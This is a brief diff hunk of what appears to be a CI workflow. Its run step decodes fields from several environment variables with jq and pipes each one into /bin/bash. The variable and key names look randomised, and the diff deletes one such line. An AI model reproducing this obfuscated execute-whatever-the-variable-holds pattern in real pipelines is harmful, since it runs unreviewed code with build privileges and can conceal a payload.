@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$ra1" | jq -r .yodgl61830 | /bin/bash
           printf '%s' "$rsdit8" | jq -r .xkmy7 | /bin/bash
-          printf '%s' "$rphf50" | jq -r .myzbz1 | /bin/bash
           printf '%s' "$vio9324" | jq -r .bl7481 | /bin/bash
           printf '%s' "$mtgp61453" | jq -r .h4 | /bin/bash
           printf '%s' "$mautp2" | jq -r .bm84 | /bin/bash
